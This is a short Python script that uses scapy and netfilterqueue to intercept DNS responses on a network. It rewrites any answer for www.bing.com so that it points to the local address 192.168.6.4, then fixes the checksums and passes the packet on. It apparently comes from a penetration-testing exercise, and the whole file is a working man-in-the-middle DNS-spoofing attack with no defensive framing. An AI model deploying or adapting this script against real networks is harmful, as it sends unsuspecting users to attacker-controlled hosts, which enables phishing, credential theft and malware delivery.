#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        website_name = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in website_name:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=website_name, rdata="192.168.6.4")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            packet.set_payload(str(scapy_packet))
            
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

